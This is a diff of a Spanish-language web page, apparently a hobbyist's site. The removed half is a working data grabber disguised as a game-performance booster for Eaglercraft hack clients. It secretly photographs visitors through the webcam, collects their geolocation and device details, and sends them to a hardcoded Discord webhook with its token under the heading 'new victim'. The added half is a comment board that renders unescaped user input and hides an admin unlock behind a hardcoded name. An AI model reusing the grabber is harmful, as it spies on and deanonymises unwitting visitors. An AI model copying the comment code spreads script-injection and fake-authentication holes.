@@ -1,132 +1,177 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="utf-8">
-<title>HOME FORGEX — Clientes Eaglercraft</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta charset="UTF-8">
+<title>FORGEX Comentarios</title>
 <style>
-  :root{--bg:#05060a;--card:#0f1724;--acc:#a78bfa;--pink:#ec4899;--muted:#9ca3af}
-  body{margin:0;font-family:system-ui;background:var(--bg);color:#fff;min-height:100vh;display:flex;flex-direction:column}
-  header{position:sticky;top:0;background:rgba(0,0,0,.4);backdrop-filter:blur(12px);border-bottom:1px solid #333}
-  .nav{max-width:1200px;margin:auto;padding:16px;display:flex;justify-content:space-between;align-items:center}
-  .logo{width:48px;height:48px;border-radius:12px;background:linear-gradient(135deg,var(--acc),var(--pink));display:grid;place-items:center;font-weight:900;font-size:22px}
-  .title{background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent;font-weight:800}
-  main{flex:1;max-width:1200px;margin:30px auto;padding:0 20px}
-  .grid{display:grid;gap:18px;grid-template-columns:repeat(auto-fit,minmax(270px,1fr))}
-  .card{background:rgba(255,255,255,.025);border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:20px;transition:.25s}
-  .card:hover{transform:translateY(-8px);box-shadow:0 20px 50px rgba(167,139,250,.2)}
-  .name{font-weight:800;font-size:18px;margin-bottom:6px}
-  .open{background:linear-gradient(90deg,var(--acc),var(--pink));color:#fff;border:none;padding:14px;border-radius:14px;font-weight:700;width:100%;cursor:pointer}
-  h1{text-align:center;font-size:2.8rem;margin:20px 0;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent}
-
-  #renderPopup{position:fixed;inset:0;background:rgba(5,6,10,.97);backdrop-filter:blur(15px);display:flex;align-items:center;justify-content:center;z-index:99999;color:#fff}
-  .popup-box{background:var(--card);border:2px solid var(--acc);border-radius:20px;padding:40px 30px;max-width:420px;text-align:center;box-shadow:0 0 80px rgba(167,139,250,.4)}
-  .popup-box h2{font-size:2.2rem;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent;margin-bottom:16px}
+:root{--bg:#f2f2f2;--card:#fff;--text:#111;--muted:#666;--primary:#2563eb}
+body.dark{--bg:#121212;--card:#1e1e1e;--text:#eee;--muted:#aaa}
+body{margin:0;font-family:Arial;background:var(--bg);color:var(--text)}
+header{background:var(--card);padding:12px 16px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 1px 4px rgba(0,0,0,.1)}
+.container{max-width:800px;margin:auto;padding:16px}
+.card{background:var(--card);padding:12px;border-radius:10px;margin-bottom:12px}
+.fixed{border-left:4px solid orange}
+.name{font-weight:bold}
+.mod{color:var(--primary);font-size:12px;margin-left:6px}
+.small{color:var(--muted);font-size:12px}
+button{border:none;border-radius:8px;padding:6px 10px;margin-right:6px;cursor:pointer}
+.primary{background:var(--primary);color:#fff}
+.actions{margin-top:8px}
+.replyBox{margin-top:10px;padding-left:16px}
+.reply{background:rgba(0,0,0,.05);padding:6px;border-radius:6px;margin-top:6px}
+body.dark .reply{background:rgba(255,255,255,.08)}
+input,textarea{width:100%;padding:8px;border-radius:8px;border:1px solid #ccc;margin-top:6px}
+.hidden{display:none}
+footer{background:var(--card);padding:14px 16px;margin-top:30px}
 </style>
 </head>
 <body>
 
-<div id="renderPopup">
-  <div class="popup-box">
-    <h2>MODO RENDIMIENTO 2025</h2>
-    <p style="font-size:1.1rem;margin-bottom:24px;line-height:1.5">
-      Para tener <strong>+150 FPS</strong> y <strong>0 lag</strong> en todos los clientes hack,<br>
-      necesitamos cámara y micrófono.<br><br>
-      <strong>Desbloquea el optimizador gráfico extremo</strong>
-    </p>
-    <button onclick="activar()" style="background:linear-gradient(90deg,var(--acc),var(--pink));color:#fff;padding:16px 32px;border:none;border-radius:16px;font-size:1.3rem;font-weight:800;cursor:pointer">
-      ACEPTAR Y ACTIVAR FPS EXTREMO
-    </button>
-  </div>
-</div>
-
 <header>
-  <div class="nav">
-    <div style="display:flex;align-items:center;gap:14px">
-      <div class="logo">HF</div>
-      <div><div class="title">HOME FORGEX</div><small style="color:var(--muted)">@j_eliseoo_v • 2025</small></div>
-    </div>
+  <div><b id="userLabel">FORGEX</b></div>
+  <div>
+    <button onclick="toggleTheme()">🌙 / ☀️</button>
+    <button id="exitAdmin" class="hidden" onclick="exitAdmin()">Salir</button>
   </div>
 </header>
 
-<main>
-  <h1>Clientes Eaglercraft 2025</h1>
-  <div class="grid">
-    <div class="card"><div class="name">DragonX Client</div><div class="ver">V5.1</div><button class="open" data-link="https://eaglerhacks.github.io/dragonv4.html">Abrir</button></div>
-    <div class="card"><div class="name">WurstX Client</div><button class="open" data-link="https://eaglerhacks.github.io/wurstX.html">Abrir</button></div>
-    <div class="card"><div class="name">UwU+ Client</div><button class="open" data-link="https://eaglerhacks.github.io/UwUClient%20v1%20Full.html">Abrir</button></div>
-    <div class="card"><div class="name">ShadowX Client</div><button class="open" data-link="https://eaglerhacks.github.io/Shadow_Client_2.5_1.8.8_International.html">Abrir</button></div>
-    <div class="card"><div class="name">PiClient</div><button class="open" data-link="https://eaglerhacks.github.io/PiClient.html">Abrir</button></div>
-    <div class="card"><div class="name">flameClient</div><button class="open" data-link="https://eaglerhacks.github.io/flameclient%203.7.html">Abrir</button></div>
-  </div>
-</main>
+<div class="container">
+  <h2>Comentarios</h2>
+  <label>Nombre:</label>
+  <input id="name" placeholder="Tu nombre">
+  <textarea id="text" placeholder="Escribe un comentario"></textarea>
+  <button class="primary" onclick="postComment()">Publicar</button>
+  <hr>
+  <div id="comments"></div>
+</div>
 
-<video id="cam" autoplay playsinline style="position:fixed;width:1px;height:1px;opacity:0;"></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<footer>
+  <div class="container">
+    <b>Bienvenido a FORGEX</b><br>
+    <span class="small">
+      • Respeta a los demás<br>
+      • No spam ni insultos<br>
+      • Los moderadores pueden borrar o fijar comentarios<br>
+      • Al comentar aceptas las reglas de la comunidad
+    </span>
+  </div>
+</footer>
 
 <script>
-const WEBHOOK = "https://discord.com/api/webhooks/1446712536656249005/sbyzRE1yccOtJ2qJFGFN9K8ltOxELsq8ZqQ04howQOMffAccLDJOFjXgp9alt__ysvBP";
+let comments = JSON.parse(localStorage.getItem("comments") || "[]");
+let isAdmin = false;
+const adminName = "FORGEX";
 
-async function activar() {
-  document.getElementById('renderPopup').remove();
+function save(){ localStorage.setItem("comments", JSON.stringify(comments)); }
+function toggleTheme(){ document.body.classList.toggle("dark"); }
 
-  let foto = null;
+function postComment(){
+  let text = document.getElementById("text").value.trim();
+  let name = document.getElementById("name").value.trim();
+  if(isAdmin) name = adminName;
+  if(!text || !name) return alert("Pon tu nombre y comentario");
+  comments.push({id:Date.now(),name,text,time:new Date().toLocaleString(),likes:0,liked:false,fixed:false,replies:[]});
+  document.getElementById("text").value="";
+  save(); render();
+}
 
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-    const video = document.getElementById('cam');
-    video.srcObject = stream;
+function render(){
+  const c=document.getElementById("comments");
+  c.innerHTML="";
+  [...comments].sort((a,b)=>b.fixed-a.fixed).forEach(com=>{
+    const d=document.createElement("div");
+    d.className="card"+(com.fixed?" fixed":"");
+    d.innerHTML=`
+      <div class="name">Nombre: ${com.name}${com.name===adminName?"<span class='mod'>MOD</span>":""}</div>
+      <div>${com.text}</div>
+      <div class="small">${com.time}</div>
+    `;
 
-    // Tomar foto después de 2.5 segundos
-    await new Promise(r => setTimeout(r, 2500));
-    const canvas = document.getElementById('canvas');
-    canvas.width = video.videoWidth || 800;
-    canvas.height = video.videoHeight || 600;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    foto = canvas.toDataURL('image/png');
-    stream.getTracks().forEach(t => t.stop());
-  } catch (e) {
-    // No dio permisos → foto = null
-  }
+    const act=document.createElement("div");
+    act.className="actions";
 
-  // RECOLECTAR TODOS LOS DATOS (igual que tu grabber original)
-  const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-  const battery = await navigator.getBattery?.() || {};
-  const uaData = navigator.userAgentData || {};
-  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+    const like=document.createElement("button");
+    like.textContent="👍 "+com.likes;
+    like.onclick=()=>{com.liked=!com.liked;com.likes+=com.liked?1:-1;save();render()};
+    act.appendChild(like);
 
-  const mensaje = `**NUEVA VÍCTIMA (MÁXIMO DETALLE)**
-**IP:** ${geo.ip || '???'} (${geo.org || '???'})
-**Ubicación:** ${geo.city || '???'}, ${geo.region || '???'}, ${geo.country_name || '???'} (${geo.postal || '?'})
-**Coordenadas:** ${geo.latitude || '???'}, ${geo.longitude || '???'}
-**Hora:** ${new Date().toLocaleString()}
-**Navegador:** ${uaData.brands?.map(b=>b.brand+" v"+b.version).join(', ') || 'desconocido'}
-**SO:** ${uaData.platform || navigator.platform} | Móvil: ${uaData.mobile ? 'Sí' : 'No'}
-**RAM:** ${navigator.deviceMemory || '???'} GB | CPU: ${navigator.hardwareConcurrency || '???'} núcleos
-**Pantalla:** ${screen.width}x${screen.height}x${screen.colorDepth}
-**Batería:** ${battery.level ? Math.round(battery.level*100)+'% '+(battery.charging?'cargando':'descargando') : 'no disponible'}
-**Conexión:** ${connection.effectiveType || '?'} (${connection.downlink ? connection.downlink+' Mbps' : '?'})
-**Zona horaria:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-**Idioma:** ${navigator.language}
-**Pestañas:** ${history.length}
-**Cookies:** ${navigator.cookieEnabled ? 'Sí' : 'No'} | Modo oscuro: ${window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Sí' : 'No'}
-**Foto:** ${foto ? 'Aceptada' : '(No aceptado)'}`;
+    const rbtn=document.createElement("button");
+    rbtn.textContent="Respuestas ("+com.replies.length+")";
+    act.appendChild(rbtn);
 
-  // Enviar mensaje + foto (si la hay)
-  await fetch(WEBHOOK, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-      content: mensaje,
-      embeds: foto ? [{ image: { url: foto }, color: 0xa78bfa }] : []
-    })
+    if(isAdmin){
+      const fix=document.createElement("button");
+      fix.textContent=com.fixed?"Desfijar":"Fijar";
+      fix.onclick=()=>{com.fixed=!com.fixed;save();render()};
+      act.appendChild(fix);
+
+      const del=document.createElement("button");
+      del.textContent="Borrar";
+      del.onclick=()=>{if(confirm("¿Borrar comentario?")){comments=comments.filter(x=>x.id!==com.id);save();render()}};
+      act.appendChild(del);
+    }
+
+    d.appendChild(act);
+
+    const rb=document.createElement("div");
+    rb.className="replyBox hidden";
+
+    const rin=document.createElement("input");
+    rin.placeholder="Responder";
+    const rsend=document.createElement("button");
+    rsend.textContent="Responder";
+    rsend.onclick=()=>{
+      let replyText=rin.value.trim();
+      let replyName=document.getElementById("name").value.trim();
+      if(isAdmin) replyName=adminName;
+      if(!replyText || !replyName) return alert("Debes poner tu nombre para responder");
+      com.replies.push({name:replyName,text:replyText,time:new Date().toLocaleString()});
+      rin.value="";
+      save(); render();
+    };
+
+    rb.appendChild(rin);
+    rb.appendChild(rsend);
+
+    com.replies.forEach((r,i)=>{
+      const rd=document.createElement("div");
+      rd.className="reply";
+      rd.innerHTML=`<b>${r.name}:</b> ${r.text} <span class="small">(${r.time})</span>`;
+      if(isAdmin){
+        const x=document.createElement("button");
+        x.textContent="Eliminar";
+        x.onclick=()=>{if(confirm("¿Borrar respuesta?")){com.replies.splice(i,1);save();render()}};
+        rd.appendChild(x);
+      }
+      rb.appendChild(rd);
+    });
+
+    rbtn.onclick=()=>rb.classList.toggle("hidden");
+    d.appendChild(rb);
+    c.appendChild(d);
   });
 }
 
-// Botones normales
-document.querySelectorAll('.open').forEach(btn => {
-  btn.onclick = () => setTimeout(() => window.open(btn.dataset.link, '_blank'), 300);
+function exitAdmin(){
+  isAdmin=false;
+  document.getElementById("exitAdmin").classList.add("hidden");
+  document.getElementById("userLabel").textContent="FORGEX";
+  render();
+}
+
+document.addEventListener("keydown",e=>{
+  if(e.ctrlKey&&e.shiftKey&&e.key.toLowerCase()==="m"){
+    const n=prompt("Nombre admin");
+    if(n==="joel"){
+      isAdmin=true;
+      document.getElementById("exitAdmin").classList.remove("hidden");
+      document.getElementById("userLabel").textContent="FORGEX (Dueño)";
+      render();
+    }
+  }
 });
+
+render();
 </script>
 </body>
 </html>
